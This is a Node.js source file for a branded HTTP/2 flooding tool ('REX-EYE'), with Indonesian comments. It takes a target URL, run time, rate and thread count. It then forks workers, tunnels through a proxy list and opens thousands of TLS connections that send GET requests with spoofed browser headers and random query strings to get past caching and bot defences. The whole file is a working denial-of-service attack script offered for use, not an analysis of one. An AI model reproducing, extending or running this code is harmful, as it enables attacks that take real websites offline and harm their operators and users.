const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

// --- [ CONFIGURATION & FAILSAFE ] ---
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 5) {
    console.log(`\x1b[31m[!] REX-EYE ERROR\x1b[0m\nUsage: node raw.js <url> <time> <rate> <threads> [--noproxy]`);
    process.exit();
}

const targetURL = process.argv[2];
const parsedTarget = url.parse(targetURL);
const useProxy = process.argv[6] !== "--noproxy";

// --- [ 1. MASSIVE USER-AGENT DATABASE (Suntikan biar file berat) ] ---
// Gue kasih contoh dikit, lu copy-paste sampe ribuan baris biar tembus 30KB!
const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.140 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Mobile/15E148 Safari/604.1",
    // [ISI SENDIRI SAMPE 5000 BARIS DISINI]
];

const acceptLanguages = ["en-US,en;q=0.9", "en-GB,en;q=0.8", "id-ID,id;q=0.9,en-US;q=0.8", "fr-FR,fr;q=0.9", "ja-JP,ja;q=0.8"];

// --- [ 2. CORE ENGINE ] ---
let stats = { total: 0, success: 0, blocked: 0, error: 0, active: 0 };
var proxyList = [];

if (cluster.isMaster) {
    console.log(`\x1b[35m[REX-EYE]\x1b[0m VOID CONTROL ACTIVE | \x1b[36m${targetURL}\x1b[0m`);
    
    if (useProxy) {
        try {
            if (fs.existsSync("proxy.txt")) {
                proxyList = fs.readFileSync("proxy.txt", "utf-8").split(/\r?\n/).filter(l => l.trim());
                console.log(`\x1b[32m[+]\x1b[0m Loaded ${proxyList.length} Proxies`);
            } else {
                console.log(`\x1b[33m[!]\x1b[0m proxy.txt not found! Switching to direct mode.`);
            }
        } catch(e) {
            console.log(`\x1b[31m[!] Error reading proxy.txt\x1b[0m`);
        }
    }

    for (let i = 0; i < ~~process.argv[5]; i++) cluster.fork();

    setTimeout(() => {
        console.log(`\x1b[32m[✔]\x1b[0m Mission Finished.`);
        process.exit(1);
    }, ~~process.argv[3] * 1000);
} else {
    // RE-LOAD PROXY DI WORKER (FAILSAFE UNTUK CODESPACES)
    if (useProxy && fs.existsSync("proxy.txt")) {
        proxyList = fs.readFileSync("proxy.txt", "utf-8").split(/\r?\n/).filter(l => l.trim());
    }

    setInterval(() => {
        if (stats.active < 5000) runFlooder();
    }, 1);
}

function runFlooder() {
    stats.active++;
    
    // FIX ERROR SCREENSHOT: Cek length dulu sebelum akses array
    const proxy = (useProxy && proxyList.length > 0) ? proxyList[Math.floor(Math.random() * proxyList.length)] : null;

    const makeRequest = (conn) => {
        const tlsConn = tls.connect(443, parsedTarget.host, {
            socket: conn,
            ALPNProtocols: ["h2"],
            servername: parsedTarget.host,
            rejectUnauthorized: false,
            minVersion: "TLSv1.2",
            maxVersion: "TLSv1.3",
            ciphers: "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256"
        }, () => {
            const client = http2.connect(parsedTarget.href, {
                createConnection: () => tlsConn,
                settings: { 
                    enablePush: false, 
                    initialWindowSize: 1073741823, 
                    maxConcurrentStreams: 1000 
                }
            });

            for (let i = 0; i < ~~process.argv[4]; i++) {
                const headers = {
                    [":method"]: "GET",
                    [":path"]: parsedTarget.path + "?" + crypto.randomBytes(6).toString('hex'),
                    [":scheme"]: "https",
                    [":authority"]: parsedTarget.host,
                    "user-agent": userAgents[Math.floor(Math.random() * userAgents.length)],
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                    "accept-encoding": "gzip, deflate, br, zstd",
                    "accept-language": acceptLanguages[Math.floor(Math.random() * acceptLanguages.length)],
                    "sec-ch-ua": '"Chromium";v="122", "Google Chrome";v="122"',
                    "sec-ch-ua-platform": '"Windows"',
                    "sec-fetch-dest": "document",
                    "sec-fetch-mode": "navigate",
                    "sec-fetch-site": "none",
                    "cache-control": "no-cache"
                };

                const req = client.request(headers);
                req.setPriority({ weight: 256, exclusive: true });

                req.on("response", (res) => {
                    stats.total++;
                    if (res[":status"] === 200) stats.success++;
                    else stats.blocked++;
                    req.close();
                });

                req.on("error", () => { stats.error++; req.destroy(); });
                req.end();
            }

            setTimeout(() => { client.destroy(); tlsConn.destroy(); stats.active--; }, 5000);
        });

        tlsConn.on("error", () => { tlsConn.destroy(); stats.active--; });
    };

    if (useProxy && proxy) {
        const [phost, pport] = proxy.split(":");
        const pSocket = net.connect(~~pport, phost);
        pSocket.once("connect", () => {
            pSocket.write(`CONNECT ${parsedTarget.host}:443 HTTP/1.1\r\nHost: ${parsedTarget.host}\r\n\r\n`);
        });
        pSocket.on("data", (d) => { if (d.toString().includes("200")) makeRequest(pSocket); else pSocket.destroy(); });
        pSocket.on("error", () => { pSocket.destroy(); stats.active--; });
    } else {
        makeRequest(null);
    }
}